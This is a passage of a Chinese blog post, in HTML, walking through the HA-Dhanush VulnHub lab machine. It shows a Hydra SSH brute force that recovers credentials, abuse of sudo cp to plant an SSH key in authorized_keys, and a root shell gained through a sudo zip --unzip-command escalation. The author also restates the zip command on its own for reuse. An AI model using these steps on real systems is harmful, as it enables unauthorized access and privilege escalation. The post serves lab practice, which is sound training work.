class="line">यद</span><br><span class="line">यग</span><br><span class="line">Arjuna</span><br><span class="line">was</span><br><span class="line">able</span><br><span class="line">his</span><br><span class="line">and</span><br><span class="line">Then</span><br><span class="line">path</span><br><span class="line">The</span><br><span class="line">Header</span><br><span class="line">लनर</span><br><span class="line">भवत</span><br><span class="line">भरत</span><br><span class="line">यत</span><br><span class="line">थनमधर</span><br><span class="line">तदत</span><br><span class="line">मन</span><br><span class="line">सजम</span><br><span class="line">यहम</span><br><span class="line">परत</span><br><span class="line">रणय</span><br><span class="line">सधन</span><br><span class="line">वनशय</span><br><span class="line">दष</span><br><span class="line">कतम</span><br><span class="line">मसस</span><br><span class="line">थपनर</span><br><span class="line">थय</span><br><span class="line">भवम</span><br><span class="line">What</span><br><span class="line">Banner</span><br><span class="line">Dhanushधनष</span><br><span class="line">Weapon</span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">shooting</span><br><span class="line">arrows</span><br><span class="line">typically</span><br><span class="line">made</span><br><span class="line">curved</span><br><span class="line">piece</span><br><span class="line">wood</span><br><span class="line">joined</span><br><span class="line">both</span><br><span class="line">ends</span><br><span class="line">Taut</span><br><span class="line">String</span><br><span class="line">दनय</span><br><span class="line">सबस</span><br><span class="line">तशल</span><br><span class="line">धनषWorld</span><br><span class="line">Most</span><br><span class="line">Powerful</span><br><span class="line">Dhanushs</span><br><span class="line">Sharang</span><br><span class="line">Dhanushसरग</span><br><span class="line">Vishnu</span><br><span class="line">Made</span><br><span class="line">Viswakarma</span><br><span class="line">Pinak</span><br><span class="line">Dhanushपनक</span><br><span class="line">ShivaMade</span><br><span class="line">pinak</span><br><span class="line">Gandiv</span><br><span class="line">Dhanushगण</span><br><span class="line">डव</span><br><span class="line">ArjunaMade</span><br><span class="line">Brahma</span><br><span class="line">Portfolio</span><br><span class="line">Choose</span><br><span class="line">Yoursअपन</span><br><span class="line">चन</span><br><span class="line">Heat</span><br><span class="line">Mahabharata</span><br><span class="line">not</span><br><span class="line">lift</span><br><span class="line">against</span><br><span class="line">Family</span><br><span class="line">Gurus</span><br><span class="line">Krishna</span><br><span class="line">tells</span><br><span class="line">him</span><br><span class="line">this</span><br><span class="line">Dhram</span><br><span class="line">Eternal</span><br><span class="line">Truth</span><br><span class="line">war</span><br><span class="line">You</span><br><span class="line">CTF</span><br><span class="line">Warrior</span><br><span class="line">Pick</span><br><span class="line">your</span><br><span class="line">attain</span><br><span class="line">Boot</span><br><span class="line">Hacking</span><br><span class="line">Articles</span><br><span class="line">All</span><br><span class="line">rights</span><br><span class="line">reserved</span><br><span class="line">Scripts</span><br><span class="line">Raj</span><br><span class="line">Aarti</span><br><span class="line">Geet</span><br><span class="line">Yashika</span><br><span class="line">Kavish</span><br><span class="line">Rishab</span><br><span class="line">Japneet</span><br><span class="line">Pavan</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破ssh的用户名和密码"><a href="#爆破ssh的用户名和密码" class="headerlink" title="爆破ssh的用户名和密码"></a>爆破ssh的用户名和密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L dict1.txt -P dict1.txt ssh://192.168.142.131 -s 65345 -I -e nsr -f</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 22:03:33</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 13338 login tries (l:114/p:117), ~834 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.142.131:65345/</span><br><span class="line">[STATUS] 214.00 tries/min, 214 tries <span class="keyword">in</span> 00:01h, 13127 to <span class="keyword">do</span> <span class="keyword">in</span> 01:02h, 16 active</span><br><span class="line">[STATUS] 149.67 tries/min, 449 tries <span class="keyword">in</span> 00:03h, 12892 to <span class="keyword">do</span> <span class="keyword">in</span> 01:27h, 16 active</span><br><span class="line">[STATUS] 154.14 tries/min, 1079 tries <span class="keyword">in</span> 00:07h, 12262 to <span class="keyword">do</span> <span class="keyword">in</span> 01:20h, 16 active</span><br><span class="line">[STATUS] 154.67 tries/min, 2320 tries <span class="keyword">in</span> 00:15h, 11024 to <span class="keyword">do</span> <span class="keyword">in</span> 01:12h, 16 active</span><br><span class="line"></span><br><span class="line">[STATUS] 151.68 tries/min, 4702 tries <span class="keyword">in</span> 00:31h, 8643 to <span class="keyword">do</span> <span class="keyword">in</span> 00:57h, 16 active</span><br><span class="line">[STATUS] 151.43 tries/min, 7117 tries <span class="keyword">in</span> 00:47h, 6229 to <span class="keyword">do</span> <span class="keyword">in</span> 00:42h, 16 active</span><br><span class="line">[65345][ssh] host: 192.168.142.131   login: pinak   password: Gandiv</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.142.131 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 22:56:20</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户名&#x2F;密码  ——  pinak&#x2F;Gandiv</li>
+</ul>
+<p>现在有了SSH的登录凭据，pinak&#x2F;Gandiv登录并进行查看。 运行sudo -l命令检查sudoers列表，发现有效的cp命令以sarang用户身份运行，没有任何密码，因此可以使用它。 看一下用户sarang。 在sarang的主目录中，看到一个标记为“ .ssh”的隐藏目录。 试图打开它，但受到限制。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh pinak@192.168.142.131 -p 65345</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.142.131]:65345 ([192.168.142.131]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.142.131]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">pinak@192.168.142.131&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Fri Nov  8 09:05:56 2019</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(pinak) gid=1001(pinak) <span class="built_in">groups</span>=1001(pinak)</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">whoami</span></span><br><span class="line">pinak</span><br><span class="line">pinak@ubuntu:~$ </span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/pinak</span><br><span class="line">pinak@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pinak on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pinak may run the following commands on ubuntu:</span><br><span class="line">    (sarang) NOPASSWD: /bin/cp</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">cd</span> /home/sarang</span><br><span class="line">pinak@ubuntu:/home/sarang$ <span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 sarang sarang 4096 Nov  8 08:03 .</span><br><span class="line">drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ..</span><br><span class="line">-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history</span><br><span class="line">-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache</span><br><span class="line">-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:35 .ssh</span><br><span class="line">pinak@ubuntu:/home/sarang$ <span class="built_in">cd</span> .ssh</span><br><span class="line">-bash: <span class="built_in">cd</span>: .ssh: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>使用cp命令进入sarang用户。 需要将ssh密钥显示在sarang用户主目录内的.ssh目录中。 尽管该文件只能读取，但可以使用cp命令在该目录中发送密钥。 为此，首先需要生成这些密钥。 为此使用ssh-keygen。 使用ssh-keygen后，进入pinak用户主目录内的.ssh目录中以找到id_rsa公钥。 给它适当的权限。 并将其移动到pinak用户主目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pinak@ubuntu:~$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/pinak/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:M3EjxpbK4Ni6vFhkYjtaUWnV7IRl6gK/2ab8B3FLz+U pinak@ubuntu</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|      .=o        |</span></span><br><span class="line"><span class="string">|     o.++.       |</span></span><br><span class="line"><span class="string">|  . = .oB o      |</span></span><br><span class="line"><span class="string">|   O +.+++ ..    |</span></span><br><span class="line"><span class="string">|..= = ++S+ o     |</span></span><br><span class="line"><span class="string">|.+.o =. .oo E    |</span></span><br><span class="line"><span class="string">| o+ o o.         |</span></span><br><span class="line"><span class="string">|.=.o o  .        |</span></span><br><span class="line"><span class="string">|o +.o...         |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ cd .ssh</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cd ..</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ ls</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br></pre></td></tr></table></figure>
+
+<p>现在已经转移了公钥，现在使用cp命令作为sarang用户在sarang用户主目录中的.ssh目录中复制公钥了。 需要将sudo与cp命令一起使用，并提供源目录和目标目录。 完成此操作后，只需要使用刚转让的密钥以sarang身份登录即可。 可以看到它运行良好。 以成功的用户身份登录后，再次运行sudo -l命令，因为该用户不是root用户，目标是获得root用户。 看到zip命令具有sudo权限，可滥用该权限来升级此计算机上的特权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br><span class="line">pinak@ubuntu:~$ ssh sarang@127.0.0.1 -i /.ssh/authorized_keys -p 65345</span><br><span class="line">Warning: Identity file /.ssh/authorized_keys not accessible: No such file or directory.</span><br><span class="line">The authenticity of host <span class="string">&#x27;[127.0.0.1]:65345 ([127.0.0.1]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[127.0.0.1]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/home/pinak/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100</span></span><br><span class="line"><span class="string">sarang@ubuntu:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for sarang on ubuntu:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass,</span></span><br><span class="line"><span class="string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User sarang may run the following commands on ubuntu:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/zip</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用最近通过ssh登录的用户sarang。 使用sudo命令列出用户可以使用root特权运行的所有命令，可以看到用户可以以root用户身份运行zip命令，而无需输入任何密码。<br>因此，现在正在将权限从“sarang”提升到“root”。 创建一个文件“lucifer11”，然后执行命令：首先将文件“lucifer11”压缩，然后将其移动到&#x2F;tmp&#x2F;lucifer11.zip文件夹，最后解压缩，然后弹出root的shell，提权成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sarang@ubuntu:~$ <span class="built_in">touch</span> lucifer11</span><br><span class="line">sarang@ubuntu:~$ <span class="built_in">ls</span></span><br><span class="line">lucifer11</span><br><span class="line">sarang@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/sarang</span><br><span class="line">sarang@ubuntu:~$ sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line">  adding: home/sarang/lucifer11 (stored 0%)</span><br><span class="line">root@ubuntu:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@ubuntu:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>这次提权方式太帅，记下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cd /root</span></span><br><span class="line">root@ubuntu:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@ubuntu:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">          </span><br><span class="line">                                            @p</span><br><span class="line">                                           @@@.</span><br><span class="line">                                          @@@@@</span><br><span class="line">                                         @@@@@@@</span><br><span class="line">                                        *<span class="string">&quot;`]@P ^^</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                               ,,,,        ]@P       ,,gg,,</span></span><br><span class="line"><span class="string">                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,</span></span><br><span class="line"><span class="string">                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w</span></span><br><span class="line"><span class="string">                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g</span></span><br><span class="line"><span class="string">                    g@@@P`                 -@                   &quot;</span>B@@w</span><br><span class="line">                  ,@@@`                    ]@                      %@@,</span><br><span class="line">                 @@P-                      ]@                        *@@,</span><br><span class="line">              ,@@<span class="string">&quot;                         ]@                          *B@</span></span><br><span class="line"><span class="string">            ,@N&quot;</span>                          y@@B                            %@,</span><br><span class="line">      ,,  g@P-                            ]@@@P                             *Bg ,gg</span><br><span class="line">      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!! Congrats you have finished this task !!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contact us here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hacking Articles : https://twitter.com/rajchandel/</span></span><br><span class="line"><span class="string">Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span></span><br><span class="line"><span class="string"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">____________________________________</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg"></p>
+<p>Flag太帅，犹如利剑正中敌人心脏！！！然后狠狠穿透！！！</p>
+<p><font color="red">Key:网页用户名收集，hydra爆破,ssh公钥滥用,&#x2F;usr&#x2F;bin&#x2F;zip,&#x2F;bin&#x2F;cp的无需root密码的权限滥用。</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2019/12/17/HA-Dhanush/" title="vulnhub靶机渗透[HA-Dhanush]">https://fdlucifer.github.io/2019/12/17/HA-Dhanush/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/12/16/LAMPSecurity-CTF6/" rel="prev" title="vulnhub靶机渗透[LAMPSecurity-CTF6]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[LAMPSecurity-CTF6]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/12/18/GoatseLinux-1/" rel="next" title="vulnhub靶机渗透[GoatseLinux-1]">
+                  vulnhub靶机渗透[GoatseLinux-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
